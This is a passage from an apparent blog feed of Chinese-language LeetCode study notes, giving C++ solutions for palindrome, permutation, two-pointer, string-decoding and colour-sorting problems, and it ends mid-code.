是字符串中的由【连续字符】组成的一个序列。<br>单个字符也是回文字串</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 下标[i,j]范围内 【回文子串的数目】</span></span><br><span class="line"><span class="comment">    初始化：false</span></span><br><span class="line"><span class="comment">    if(s[i]==s[j])&#123;</span></span><br><span class="line"><span class="comment">        if(j-i&lt;=1)</span></span><br><span class="line"><span class="comment">            dp[i][j] = true;//是回文子串</span></span><br><span class="line"><span class="comment">            count++;//个数++</span></span><br><span class="line"><span class="comment">        else if(dp[i+1][j-1]==true)</span></span><br><span class="line"><span class="comment">            dp[i][j] = true;</span></span><br><span class="line"><span class="comment">            count++;  </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    重点！遍历顺序！相对位置如下</span></span><br><span class="line"><span class="comment">    [i-1,j-1] [i-1,j]</span></span><br><span class="line"><span class="comment">    [i , j-1] [i , j]</span></span><br><span class="line"><span class="comment">    [i+1,j-1] [i+1,j]</span></span><br><span class="line"><span class="comment">    i对应一行一行的遍历，【从下到上】</span></span><br><span class="line"><span class="comment">    j对应一列一列的遍历，从左到右</span></span><br><span class="line"><span class="comment">    【之前都是，从上到下，从左到右】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">countSubstrings</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">bool</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">bool</span>&gt;(n,<span class="literal">false</span>));<span class="comment">//初始false</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j-i&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;<span class="comment">//是回文子串</span></span><br><span class="line">                        count++;<span class="comment">//个数++</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        count++; </span><br><span class="line">                    &#125;      </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="5-最长回文子串——连续-子串"><a href="#5-最长回文子串——连续-子串" class="headerlink" title="5 最长回文子串——连续-子串"></a>5 最长回文子串——连续-子串</h3><p>给你一个字符串 s，找到 s 中【最长的回文子串】。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 在上题基础上 更新每个回文子串的长度下标</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">longestPalindrome</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> len=<span class="number">0</span>,l,r;<span class="comment">//记录最长回文串的 下标范围</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;n;j++)&#123;<span class="comment">//从i开始</span></span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j-i&lt;=<span class="number">1</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;<span class="comment">//是回文子串</span></span><br><span class="line">                        <span class="keyword">if</span>(j-i+<span class="number">1</span>&gt;len)&#123;<span class="comment">//这里！</span></span><br><span class="line">                            l=i; r=j;</span><br><span class="line">                            len = j-i+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span>(dp[i+<span class="number">1</span>][j<span class="number">-1</span>]==<span class="literal">true</span>)&#123;</span><br><span class="line">                        dp[i][j] = <span class="literal">true</span>;</span><br><span class="line">                        <span class="keyword">if</span>(j-i+<span class="number">1</span>&gt;len)&#123;<span class="comment">//这里！</span></span><br><span class="line">                            l=i; r=j;</span><br><span class="line">                            len = j-i+<span class="number">1</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;      </span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=l;i&lt;=r;i++)&#123;</span><br><span class="line">            str += s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">        <span class="comment">//或者直接返回 s.substr(l,r-l+1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="516-最长回文子序列——非连续-子序列"><a href="#516-最长回文子序列——非连续-子序列" class="headerlink" title="516 最长回文子序列——非连续-子序列"></a>516 最长回文子序列——非连续-子序列</h3><p>给你一个字符串 s ，找出其中最长的回文子序列，并【返回该序列的长度】。<br><strong>子序列</strong>定义为：不改变剩余字符顺序的情况下，删除某些字符或者不删除任何字符形成的一个序列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    动态规划</span></span><br><span class="line"><span class="comment">    dp[i][j] 下标[i,j]范围内 【最长回文子序列长度】</span></span><br><span class="line"><span class="comment">    if(s[i]==s[j])</span></span><br><span class="line"><span class="comment">        dp[i][j] = dp[i-1][j-1]+2;</span></span><br><span class="line"><span class="comment">    else</span></span><br><span class="line"><span class="comment">        dp[i][j] = max(dp[i+1][j],dp[i][j-1]);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestPalindromeSubseq</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">dp</span>(n,vector&lt;<span class="keyword">int</span>&gt;(n,<span class="number">0</span>));</span><br><span class="line">        <span class="comment">//int res = 1;//这里要初始化为1</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            dp[i][i] = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">0</span>;i--)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;n;j++)&#123;<span class="comment">//从i+1开始</span></span><br><span class="line">                <span class="keyword">if</span>(s[i]==s[j])</span><br><span class="line">                    dp[i][j] = dp[i+<span class="number">1</span>][j<span class="number">-1</span>]+<span class="number">2</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i+<span class="number">1</span>][j],dp[i][j<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">//res = max(res,dp[i][j]);</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="46-全排列"><a href="#46-全排列" class="headerlink" title="46 全排列"></a>46 全排列</h2><p>给定一个不含重复数字的数组 nums ，返回其 所有可能的全排列 。你可以 按任意顺序 返回答案。</p><p><strong>回溯法</strong>：一种通过探索所有可能的候选解来找出所有的解的算法。如果候选解被确认不是一个解（或者至少不是最后一个解），回溯算法会通过在上一步进行一些变化抛弃该解，即回溯并且再次尝试。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        <span class="built_in">dfs</span>(nums);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">    vector&lt;<span class="keyword">int</span>&gt; cur;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (cur.<span class="built_in">size</span>() == nums.<span class="built_in">size</span>()) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(cur);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] != <span class="number">99</span>) &#123;<span class="comment">//没被用过</span></span><br><span class="line">                <span class="keyword">int</span> temp = nums[i];<span class="comment">//暂存</span></span><br><span class="line">                cur.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line"></span><br><span class="line">                nums[i] = <span class="number">99</span>;<span class="comment">//存入cur后标记 改为“用过”</span></span><br><span class="line">                <span class="built_in">dfs</span>(nums);</span><br><span class="line">                nums[i] = temp;</span><br><span class="line">                cur.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">backtrack</span><span class="params">(vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt;&amp; res,vector&lt;<span class="keyword">int</span>&gt;&amp; output,<span class="keyword">int</span> first,<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">        <span class="comment">//first:从左往右填到第first位置，当前的排列是output</span></span><br><span class="line">        <span class="comment">//first==len 证明一轮填写完毕</span></span><br><span class="line">        <span class="keyword">if</span>(first==len)&#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(output);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=first;i&lt;len;i++)&#123;</span><br><span class="line">            <span class="built_in">swap</span>(output[i],output[first]);</span><br><span class="line">            <span class="built_in">backtrack</span>(res,output,first+<span class="number">1</span>,len);<span class="comment">//递归填下一个数</span></span><br><span class="line">            <span class="built_in">swap</span>(output[i],output[first]);<span class="comment">//撤销操作</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permute</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">backtrack</span>(res,nums,<span class="number">0</span>,(<span class="keyword">int</span>)nums.<span class="built_in">size</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="47-全排列-II"><a href="#47-全排列-II" class="headerlink" title="47 全排列 II"></a>47 全排列 II</h2><p>给定一个可包含重复数字的序列 nums ，按任意顺序 返回所有不重复的全排列。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; <span class="built_in">permuteUnique</span>(vector&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="keyword">int</span>&gt;&gt; ans;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">do</span>&#123;</span><br><span class="line">            ans.<span class="built_in">push_back</span>(nums);</span><br><span class="line">        &#125;<span class="keyword">while</span>(<span class="built_in">next_permutation</span>(nums.<span class="built_in">begin</span>(),nums.<span class="built_in">end</span>()));</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>九、力扣-Top10</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%B9%9D%E3%80%81Top-100/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%B9%9D%E3%80%81Top-100/</id>
    <published>2025-12-03T06:15:58.000Z</published>
    <updated>2025-12-03T06:15:50.402Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="九、力扣-Top10"><a href="#九、力扣-Top10" class="headerlink" title="九、力扣-Top10"></a>九、力扣-Top10</h2><h3 id="11-盛最多水的容器"><a href="#11-盛最多水的容器" class="headerlink" title="11 盛最多水的容器"></a>11 盛最多水的容器</h3><p>给定一个长度为 n 的整数数组 height 。有 n 条垂线，第 i 条线的两个端点是 (i, 0) 和 (i, height[i]) 。<br>找出其中的两条线，使得它们与 x 轴共同构成的容器可以容纳最多的水。<br>返回【容器可以储存的最大水量】。<br>说明：不能倾斜容器。<br><img src="https://img-blog.csdnimg.cn/4959335ebcd449c896ad603ddd3c5183.png"><br><strong>分析：</strong> 容纳的水量是由<br><strong>【水量】：两个指针指向的数字中较小值∗指针之间的距离</strong><br>如果我们移动数字较大的那个指针，那么前者「两个指针指向的数字中较小值」【不会增加】，后者「指针之间的距离」会减小，那么这个乘积会减小。<br>所以：每次需要移动 height[]值较小的那个指针。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    双指针</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxArea</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; height)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> l = <span class="number">0</span>, r = height.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> max_val = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(l&lt;r)&#123;</span><br><span class="line">            <span class="keyword">int</span> tmp = <span class="built_in">min</span>(height[l],height[r])*(r-l);</span><br><span class="line">            <span class="comment">//if(height[r]&gt;height[l])</span></span><br><span class="line">            max_val = <span class="built_in">max</span>(max_val,tmp);<span class="comment">//更新 最大水量</span></span><br><span class="line">            <span class="keyword">if</span>(height[l]&gt;=height[r])<span class="comment">//注意：记得写上【相等】的情况，如果不写，当遇到两个指针指向的水量相同时，就不会移动，那么循环将永远无法退出，也就会出现时间超时现象</span></span><br><span class="line">                r--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(height[l]&lt;height[r])</span><br><span class="line">                l++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max_val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="394-字符串解码"><a href="#394-字符串解码" class="headerlink" title="394 字符串解码"></a>394 字符串解码</h3><p>给定一个经过编码的字符串，返回它解码后的字符串。<br>编码规则为: k[encoded_string]，表示其中方括号内部的 encoded_string 正好重复 k 次。注意 k 保证为正整数。<br>你可以认为输入字符串总是有效的；输入字符串中没有额外的空格，且输入的方括号总是符合格式要求的。<br>此外，你【可以认为原始数据不包含数字】，所有的数字只表示重复的次数 k ，例如不会出现像 3a 或 2[4] 的输入。</p><p><strong>分析：</strong><br>本题中可能出现括号嵌套的情况，比如 2[a2[bc]]，这种情况下我们可以先转化成 2[abcbc]，再转化成 abcbcabcbc。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">decodeString</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;pair&lt;<span class="keyword">int</span>,string&gt;&gt; stk;</span><br><span class="line">        <span class="keyword">int</span> num = <span class="number">0</span>;</span><br><span class="line">        string str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">&#x27;a&#x27;</span> &amp;&amp; s[i]&lt;=<span class="string">&#x27;z&#x27;</span>)&#123;</span><br><span class="line">                str += s[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]&gt;=<span class="string">&#x27;0&#x27;</span> &amp;&amp; s[i] &lt;= <span class="string">&#x27;9&#x27;</span>)&#123;</span><br><span class="line">                num *= <span class="number">10</span>;<span class="comment">//因为数字 不止仅仅是 个位数 </span></span><br><span class="line">                num += s[i]-<span class="string">&#x27;0&#x27;</span>;<span class="comment">//转整数</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;[&#x27;</span>)&#123;</span><br><span class="line">                stk.<span class="built_in">push</span>(<span class="built_in">make_pair</span>(num,str));</span><br><span class="line">                num = <span class="number">0</span>;<span class="comment">//一定要清0</span></span><br><span class="line">                str = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;]&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">int</span> count = stk.<span class="built_in">top</span>().first;</span><br><span class="line">                string a = stk.<span class="built_in">top</span>().second;</span><br><span class="line">                stk.<span class="built_in">pop</span>();<span class="comment">//总是忘记 弹出栈</span></span><br><span class="line">                <span class="keyword">while</span>(count--)</span><br><span class="line">                    a = a + str;</span><br><span class="line">                str = a;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> str;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="75-颜色分类"><a href="#75-颜色分类" class="headerlink" title="75 颜色分类"></a>75 颜色分类</h3><p>给定一个包含【红色、白色和蓝色】、共 n 个元素的数组 nums，原地对它们进行排序，使得相同颜色的元素相邻，并【按照红色、白色、蓝色顺序排列】。<br>我们使用整数 0、 1 和 2 分别表示红色、白色和蓝色。<br>必须在不使用库内置的 sort 函数的情况下解决这个问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//直接记录个数，再重新放入</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">sortColors</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n0 = <span class="number">0</span>, n1 = <span class="number">0</span>, n2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:nums)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">0</span>) n0++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">1</span>) n1++;</span><br><span class="line">            <span class="keyword">if</span>(i == <span class="number">2</span>) n2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;n0)</span><br><span class="line">                nums[i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(i&lt;n0+n1)</span><br><span class="line">                nums[i] = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                nums[i] = <span class="number">2</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//双指针</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span 